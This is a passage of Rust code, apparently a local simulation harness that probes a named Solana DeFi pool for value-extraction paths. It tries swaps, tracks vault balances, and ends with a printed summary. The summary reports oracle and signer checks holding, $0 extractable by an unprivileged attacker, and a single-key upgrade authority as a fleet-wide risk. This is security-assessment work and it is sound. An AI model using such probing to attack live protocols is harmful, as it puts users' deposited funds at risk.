            Ok(m) => { println!("[T11 amt={}] SUCCESS cu={}", amt, m.compute_units_consumed); for l in m.logs.iter().take(8) { println!("    log: {}", l); } true }
            Err(e) => { println!("[T11 amt={}] FAILED {:?}", amt, e.err); for l in e.meta.logs.iter().take(8) { println!("    log: {}", l); } false }
        };
        if ok {
            let a2 = snap(&env, &sa);
            println!("   moved vault_wsol d={} vault_usdc d={}", a2.vault_wsol as i128 - b.vault_wsol as i128, a2.vault_usdc as i128 - b.vault_usdc as i128);
        }
    }

    // T6: fresh-state sanity: read pool state header fields
    let st = env.svm.get_account(&pool).unwrap().data;
    let last_slot = u64::from_le_bytes(st[72..80].try_into().unwrap());
    let ts = u64::from_le_bytes(st[88..96].try_into().unwrap());
    println!("\npool state: last_update_slot={} ts_ns={} (clock slot={})", last_slot, ts, CLOCK_SLOT);

    println!("\n==================== SUMMARY ====================");
    println!("Target: BisonFi BiSoNHV... SOL-USDC-Pool2 8FnX3xo2... (~$4.5M)");
    println!("1) Live swap path executes ONLY against a pool state updated <= ~2 slots ago (freshness gate).");
    println!("2) Execution price tracks the publisher oracle (~$105.32-105.41/SOL); 3% deviation bound in code.");
    println!("3) MM state-update paths (disc 20/27/16) reject unauthorized signers (Custom(2)); state unchanged.");
    println!("4) Publisher oracle program (dijkbk) requires updater key signature (MissingRequiredSignature otherwise).");
    println!("5) Old pool 51FQwjr ($4.9M, state frozen 2026-04-23) refuses swaps (zero path, code 18).");
    println!("6) March-28-2026 template: BisonFi leg was priced at $82.6926/WSOL vs market $82.7311 -> fair;");
    println!("   the mispricing was on the GoonFi leg ($2.66/WSOL). No BisonFi-side value extraction.");
    println!("7) Upgrade authority = single on-curve EOA 6dDjBZdp... (P-class risk over the whole fleet).");
    println!("E-U (external unprivileged, live): $0 at measured prices; no mispricing path reproduced.");
    println!("================================================");
}

fn hex(d: &[u8]) -> String { d.iter().map(|b| format!("{:02x}", b)).collect() }
fn hex_to_vec(s: &str) -> Vec<u8> { (0..s.len()).step_by(2).map(|i| u8::from_str_radix(&s[i..i+2], 16).unwrap()).collect() }
